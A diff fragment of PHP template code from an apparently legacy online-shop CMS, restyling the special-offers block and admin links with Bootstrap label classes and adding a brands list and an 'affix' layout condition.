 
 
 require ("./modules/main.php");
-
 if ($style['catid_desc']==1){
 if (($query=="")&&($register!=1)&&($action!="doubles")&&($action!="replacer")&&($action!="addtospec")&&($action!="tospec")&&($action!="folderimg")&&($action!="viewfile")&&($action!="zakaz")&&($action!="basket")&&($action!="allnews")&&($action!="clear")&&($action!="sendmail")&&($action!="sendok")&&($action!="forum")&&($action!="forum_admin")&&($action!="vreg")&&($action!="view_users")&&($action!="view_links")&&($action!="view_cmenu")&&($action!="links")&&($action!="view_baskets")&&($action!="template")&&($action!="htaccess")&&($action!="userip")&&($mod!="admin")&&($action!="send")){
 require ("./modules/catid_desc2.php");
@@ -2527,11 +2623,10 @@ if ($catid==""){$catidy=@$podstava["".@$dir."|".@$subdir."|"];}else{$catidy=$cat
 
 if ((@file_exists("$base_loc/db_spec_$catidy.txt"))&&($view_spec=="r")) { } else {$catidy="_";}
 if ((@file_exists("$base_loc/db_spec_$catidy.txt"))&&($view_spec=="r")&&($mod!="admin")) {
-if ($usetheme==0) {$spectit="<div align=center><b><font color=\"".$style['nav_col1']."\">".$lang[236]."</font></b></div>";} else {$spectit="";}
+if ($usetheme==0) {$spectit="<div align=center><span class=\"label label-info\">".$lang[236]."</span></div>";} else {$spectit="";}
 
 
 $oldperpage=$perpage;
-
 
 if ($smod=="shop"){
 
@@ -2564,7 +2659,7 @@ $cols_of_goods=$last_cg;
 if ($catidy=="_") { $glav=" ".$lang[276]; } else {$glav="";}
 if(($details[7]=="ADMIN")||($details[7]=="MODER")){
 if (($valid=="1")){
-$specadmi= "<small><b>".$lang[236]."</b></small><br>$carat <small><a href=\"$htpath/index.php?clear_spec=$catidy&catid=$catid&unifid=$unifid\">".$lang['del']."$glav</a></small><br>$carat <small><a href=\"$htpath/index.php?clear_spec=all&catid=$catid&unifid=$unifid\">".$lang[237]."</a></small><br><br>";
+$specadmi= "<span class=\"label label-info\">".$lang[236]."</span><br>$carat <span class=lnk><a href=\"$htpath/index.php?clear_spec=$catidy&catid=$catid&unifid=$unifid\">".$lang['del']."$glav</a></span><br>$carat <span class=lnk><a href=\"$htpath/index.php?clear_spec=all&catid=$catid&unifid=$unifid\">".$lang[237]."</a></span><br><br>";
 $spec_spisok.=$specadmi;
 }
 }
@@ -2580,7 +2675,12 @@ top("", "$spectit$spec_spisok", "100%",  $nc0, $nc0 , "noshadow",1, "[specpr]");
 if ($view_birth=="r") {
 top("<div style=\"white-space:nowrap;\"><small>$lang[1497]</small></div>", "$birthday", $style ['right_width'], $nc2, $nc0, 5,0,"[birthday]");
 }
+if (($smod=="shop")&&($action!="allbrands")&&($brandtype==3)){
 
+require ("./modules/brands.php");
+topwo ($lang[355], $brandslist, "100%", strtolower($style ['new']), strtolower($style ['left_menu']), 2,0, "[brandlist]");
+
+}
 if (($incart_menu==0)&&($unifid!="")&&($catid=="")) {include "./templates/$template/menu.inc";
 echo "$admined"; }
 
@@ -2589,9 +2689,9 @@ top("", "$tags_cloud", $style ['right_width'], $nc2, $nc0, 5,0,"[tagclouds]");
 }
 
 if ($usetheme==0) {
-
+if ($affix==0) {
 echo "</td></tr>";
-
+}
 /*
 if ($css_style==1) {
 echo "<tr><td colspan=\"2\" align=\"center\" valign=\"top\"></td><td align=\"center\" valign=\"top\"><img src=\"$image_path/pix.gif\" width=1 height=1 border=0></td><td colspan=\"2\" align=\"center\" valign=\"top\"></td></tr>
